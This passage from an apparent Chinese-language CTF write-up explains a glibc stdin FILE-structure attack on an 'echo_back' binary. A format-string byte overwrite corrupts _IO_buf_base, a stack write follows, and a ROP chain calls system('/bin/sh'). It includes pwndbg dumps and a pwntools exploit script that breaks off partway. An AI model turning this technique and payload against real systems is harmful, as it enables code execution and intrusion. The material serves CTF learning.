  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* Maybe we already have a push back pointer.  */</span>  
      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token function">free</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  
      fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>_IO_IN_BACKUP<span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  

  <span class="token comment" spellcheck="true">/* FIXME This can/should be moved to genops ?? */</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF<span class="token operator">|</span>_IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* We used to flush all line-buffered stream.  This really isn't 
     required by any standard.  My recollection is that 
     traditional Unix systems did this for stdout.  stderr better 
     not be line buffered.  So we do just that here 
     explicitly.  --drepper */</span>  
      <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_stdout<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_NO_WRITES <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>  
      <span class="token operator">==</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

      <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  

  <span class="token function">_IO_switch_to_get_mode</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  

  <span class="token comment" spellcheck="true">/* This is very tricky. We have to adjust those 
     pointers before we call _IO_SYSREAD () since 
     we may longjump () out while waiting for 
     input. Those pointers may be screwed up. H.J. */</span>  
  fp<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  
  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//重新设置新的 _IO_buf_base</span>
  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_end  
    <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  
  <span class="token comment" spellcheck="true">//--------------------------------------</span>
  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span>
          fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入长度:fp->_IO_buf_end - fp->_IO_buf_base</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_EOF_SEEN<span class="token punctuation">;</span>  
      <span class="token keyword">else</span>  
    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
  <span class="token punctuation">}</span>  
  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使 _IO_read_end指针向后移动 </span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* If a stream is read to EOF, the calling application may switch active 
     handles.  As a result, our offset cache would no longer be valid, so 
     unset it.  */</span>  
      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>  
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset <span class="token operator">!=</span> _IO_pos_BAD<span class="token punctuation">)</span>  
    <span class="token function">_IO_pos_adjust</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  
<span class="token punctuation">}</span></code></pre>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>IO_SYSREAD系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
<p>要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度</p>
<p>首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#leaking_IO_buf_base</span>
    _IO_2_1_stdin_ <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
    _IO_buf_base <span class="token operator">=</span> _IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">7</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_buf_base'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>来看看_IO_buf_base的值</p>
<pre><code>0x7ffb6a2b08e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007ffb6a2b0964
0x7ffb6a2b08f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007ffb6a2b0964    0x00007ffb6a2b0963
0x7ffb6a2b0900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffb6a2b0963    0x00007ffb6a2b0963
0x7ffb6a2b0910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007ffb6a2b0963    0x00007ffb6a2b0963 //IO_buf_base
0x7ffb6a2b0920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007ffb6a2b0964    0x0000000000000000 //IO_buf_end
0x7ffb6a2b0930 &lt;_IO_2_1_stdin_+80&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b0940 &lt;_IO_2_1_stdin_+96&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b0950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000    0xffffffffffffffff
0x7ffb6a2b0960 &lt;_IO_2_1_stdin_+128&gt;:    0x000000000a000000    0x00007ffb6a2b2790
0x7ffb6a2b0970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff    0x0000000000000000
0x7ffb6a2b0980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffb6a2b09c0    0x0000000000000000
0x7ffb6a2b0990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b09a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff    0x0000000000000000
0x7ffb6a2b09b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000    0x00007ffb6a2af6e0</code></pre>
<p>先是stdin的位置,当前位于0x7ffb6a2b08e0</p>
<p>然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 = 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 = 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere</p>
<p>先来覆盖_IO_buf_base的低1字节为0</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#modify _IO_buf_base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%16$hhn'</span> <span class="token comment" spellcheck="true">#不打印,即个数为0</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span></code></pre>
<p>接下来，就可以覆盖结构体里的一些数据了</p>
<p>对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&amp;main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.</p>
<p>于是，payload</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#build payload to modify _IO_2_1_stdin struct</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x83</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>
<p>在length:后面发送payload, 因为这个地方用到了scanf</p>
<p>现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据</p>
<pre class=" language-c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断是否已经读完, 想要能写入缓冲数据,就得把让ptr >= end,这样才能使新的数据重新读入到缓冲区里 </span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  </code></pre>
<p>之前，覆盖结构体数据时，后面执行了这一步，使得 fp-&gt;_IO_read_end += count 相当于fp-&gt;_IO_read_end += len(p)</p>
<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//重新设置新的 _IO_buf_base</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span>
          fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入长度:fp->_IO_buf_end - fp->_IO_buf_base</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使 _IO_read_end指针向后移动</span></code></pre>
<p>下面为输入之前的_IO_2_1_stdin_</p>
<pre><code>0x7fa95326b8e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007fa95326b901 //_IO_read_ptr
                                    //IO_read_end
0x7fa95326b8f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007fa95326b928    0x00007fa95326b900
0x7fa95326b900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007fa95326b963    0x00007fa95326b963
0x7fa95326b910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007fa95326b963    0x00007ffddf79fbe8
0x7fa95326b920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007ffddf79fc00    0x0000000000000000</code></pre>
<p>而 getchar() 的作用是使fp-&gt;_IO_read_ptr + 1</p>
<p>由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr ==  PIO_read_end</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    </code></pre>
<p>调用 len(p) - 1次getchar()后, _IO_2_1_stdin_ 如下</p>
<pre><code>pwndbg&gt; x /40gx &amp;_IO_2_1_stdin_
0x7f1a9a51f8e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007f1a9a51f928 //_IO_read_ptr
                                    //IO_read_end
0x7f1a9a51f8f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007f1a9a51f928    0x00007f1a9a51f900
0x7f1a9a51f900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007f1a9a51f963    0x00007f1a9a51f963
0x7f1a9a51f910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007f1a9a51f963    0x00007fff14080e88
0x7f1a9a51f920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007fff14080ea0    0x0000000000000000
0x7f1a9a51f930 &lt;_IO_2_1_stdin_+80&gt;:    0x0000000000000000    0x0000000000000000
</code></pre>
<h2 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h2><p>然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#build rop chail</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    </code></pre>
<p>下面为输入修改后的堆栈</p>
<pre><code>pwndbg&gt; stack 50
00:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]
01:0008│ rsi  0x7fff92ceeee0 ◂— 0x0
02:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d00
03:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
04:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp
05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
06:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax
07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r15
08:0040│      0x7fff92ceef18 ◂— 0xffffffda00000001
09:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi
0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d00
0b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
0c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi //修改为pop_rdi _ret
0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi
</code></pre>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>只需使main函数ret即可</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#get shell</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"echo_back"</span>
libFile  <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">54180</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">eb</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span>text<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token comment" spellcheck="true"># leaking libc base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%19$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    libc_start_main <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
    libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh_addr  <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leaking elf base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%14$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    elf_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xD30</span>
    main_addr <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xC6C</span>
    pop_rdi_ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xd93</span>
    li<span class="token punctuation">(</span><span class="token string">'elf_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#leaking main ret in stack</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%12$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    main_ret <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x8</span>


